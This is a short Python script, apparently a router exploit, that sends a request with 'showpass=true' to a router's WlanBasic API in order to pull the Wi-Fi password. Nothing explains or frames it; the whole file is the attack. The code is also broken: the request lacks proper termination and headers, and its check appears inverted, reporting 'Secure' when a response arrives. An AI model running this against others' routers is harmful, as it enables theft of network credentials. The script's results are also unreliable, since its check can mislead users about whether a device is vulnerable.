#!/usr/bin/env python3

import socket,sys

ip = sys.argv[1] # 192.168.1.1

s = socket.socket()
try:
	s.connect((ip,80))
except:
	print('Connection Error ..!')
	exit()
s.send(b'GET /api/ntwk/WlanBasic?showpass=true HTTP/1.1')
try:
	if s.recv(61561561).decode('utf-8') != '':
		print(f'Secure .!')
		exit()
	else:
		print(f'[+] Done')
except :
	print(f'\n[-] Stopped ..!' )
